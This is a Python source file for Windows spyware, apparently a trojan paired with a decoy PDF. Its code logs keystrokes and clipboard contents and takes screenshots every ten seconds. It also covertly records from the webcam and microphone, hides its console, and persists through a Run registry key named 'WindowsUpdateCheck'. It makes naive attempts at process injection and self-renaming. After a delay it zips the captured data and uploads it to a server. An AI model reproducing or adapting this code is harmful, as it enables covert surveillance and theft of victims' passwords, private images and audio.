import os
import sys
import time
import logging
import pyperclip
import threading
import base64
import shutil
import subprocess
import ctypes
import random
import zipfile
import requests
import psutil
from cryptography.fernet import Fernet
from pynput import keyboard
from mss import mss
import cv2
import pyaudio
import wave
import winreg as reg
from datetime import datetime

# Directories
BASE_DIR = "C:\\Users\\Public\\SpyWin"
SECURE_LOGS = os.path.join(BASE_DIR, "SecureLogs")
MIC_RECORDS = os.path.join(BASE_DIR, "Mic_Records")
SCREENSHOTS = os.path.join(BASE_DIR, "ScreenCapture_Records")
CAMERA_CAPTURES = os.path.join(BASE_DIR, "Camera_Records")

for folder in [SECURE_LOGS, MIC_RECORDS, SCREENSHOTS, CAMERA_CAPTURES]:
    os.makedirs(folder, exist_ok=True)

# Encryption Setup
timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
key_filename = os.path.join(SECURE_LOGS, f"key_{timestamp}.key")
log_filename = os.path.join(SECURE_LOGS, f"log_{timestamp}.txt")
key = Fernet.generate_key()
cipher_suite = Fernet(key)
with open(key_filename, "wb") as f:
    f.write(key)
logging.basicConfig(filename=log_filename, level=logging.INFO, format='%(asctime)s - %(message)s')

# Encrypt Function
def encrypt_data(data):
    return cipher_suite.encrypt(data.encode()).decode()

# --- Individual Modules ---
def keylogger():
    def on_press(key):
        try:
            char = key.char if hasattr(key, 'char') and key.char else str(key)
            logging.info(encrypt_data(char))
        except Exception as e:
            logging.info(encrypt_data(f"[ERROR] {str(e)}"))
    keyboard.Listener(on_press=on_press).start()

def clipboard_monitor():
    last = ""
    while True:
        try:
            clip = pyperclip.paste()
            if clip != last:
                last = clip
                logging.info(encrypt_data(f"Clipboard: {clip}"))
        except Exception as e:
            logging.info(encrypt_data(f"Clipboard Error: {e}"))
        time.sleep(5)

def screen_capture():
    with mss() as sct:
        while True:
            name = f"screenshot_{time.strftime('%Y%m%d-%H%M%S')}.png"
            sct.shot(output=os.path.join(SCREENSHOTS, name))
            time.sleep(10)

def camera_spy():
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Use DirectShow backend for Windows

    if not cap.isOpened():
        logging.info(encrypt_data("❌ Camera not accessible"))
        return

    try:
        # Warm up the camera
        for _ in range(10):
            cap.read()
            time.sleep(0.1)

        while True:
            ret, frame = cap.read()
            if ret:
                timestamp = time.strftime('%Y%m%d-%H%M%S')
                filename = os.path.join(CAMERA_CAPTURES, f"camera_{timestamp}.jpg")
                cv2.imwrite(filename, frame)
            time.sleep(10)
    except Exception as e:
        logging.info(encrypt_data(f"❌ Camera error: {str(e)}"))
    finally:
        cap.release()

def microphone_spy():
    pa = pyaudio.PyAudio()
    chunk = 1024
    fmt = pyaudio.paInt16
    ch = 1
    rate = 44100
    secs = 15
    while True:
        try:
            stream = pa.open(format=fmt, channels=ch, rate=rate, input=True, frames_per_buffer=chunk)
            frames = [stream.read(chunk) for _ in range(0, int(rate / chunk * secs))]
            stream.stop_stream()
            stream.close()
            filename = os.path.join(MIC_RECORDS, f"mic_{time.strftime('%Y%m%d-%H%M%S')}.wav")
            with wave.open(filename, 'wb') as wf:
                wf.setnchannels(ch)
                wf.setsampwidth(pa.get_sample_size(fmt))
                wf.setframerate(rate)
                wf.writeframes(b''.join(frames))
        except:
            pass
        time.sleep(5)

def hide_console():
    if sys.platform == "win32":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def generate_polymorphic_copy():
    new_name = f"{random.randint(1000, 9999)}.exe"
    current_exe = sys.argv[0]
    script = f"""
import os, time
time.sleep(1)
try:
    os.rename(r'{current_exe}', r'{new_name}')
except Exception as e:
    print("Rename failed:", e)
"""
    with open("temp_renamer.py", "w") as f:
        f.write(script)

    subprocess.Popen(["python", "temp_renamer.py"], creationflags=subprocess.CREATE_NO_WINDOW)

def inject_into_memory(target_process="explorer.exe"):
    for proc in psutil.process_iter():
        if target_process.lower() in proc.name().lower():
            try:
                ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, proc.pid)
                return proc.pid
            except:
                pass
    return None

def add_to_startup():
    path = os.path.abspath(sys.argv[0])
    key = reg.HKEY_CURRENT_USER
    reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    with reg.OpenKey(key, reg_path, 0, reg.KEY_SET_VALUE) as rk:
        reg.SetValueEx(rk, "WindowsUpdateCheck", 0, reg.REG_SZ, path)

def open_legit_pdf():
    subprocess.Popen(["start", "C:\\Users\\HP\\Desktop\\Ghibili_Studio_Art.pdf"], shell=True)
    
def zip_logs():
    zip_path = os.path.join(BASE_DIR, f"data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for folder in [SECURE_LOGS, MIC_RECORDS, SCREENSHOTS, CAMERA_CAPTURES]:
                for foldername, _, files in os.walk(folder):
                    for file in files:
                        f_path = os.path.join(foldername, file)
                        arc = os.path.relpath(f_path, BASE_DIR)
                        zipf.write(f_path, arc)
        return zip_path
    except Exception as e:
        logging.info(encrypt_data(f"Zip Error: {e}"))
        return None

def send_to_server(zip_file, url="https://example.com/upload"):
    try:
        with open(zip_file, 'rb') as f:
            files = {'file': (os.path.basename(zip_file), f)}
            r = requests.post(url, files=files)
            logging.info(encrypt_data(f"Upload status: {r.status_code}"))
    except Exception as e:
        logging.info(encrypt_data(f"Upload failed: {e}"))

def delayed_exfiltration():
    time.sleep(180)
    zip_path = zip_logs()
    if zip_path:
        send_to_server(zip_path)

# Main Execution
def main():
    hide_console()
    add_to_startup()
    open_legit_pdf()
    inject_into_memory()
    if ".exe" in sys.argv[0]:
        generate_polymorphic_copy()

    threads = [
        threading.Thread(target=keylogger, daemon=True),
        threading.Thread(target=clipboard_monitor, daemon=True),
        threading.Thread(target=screen_capture, daemon=True),
        threading.Thread(target=camera_spy, daemon=True),
        threading.Thread(target=microphone_spy, daemon=True),
        threading.Thread(target=delayed_exfiltration, daemon=True)
    ]

    for t in threads:
        t.start()
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
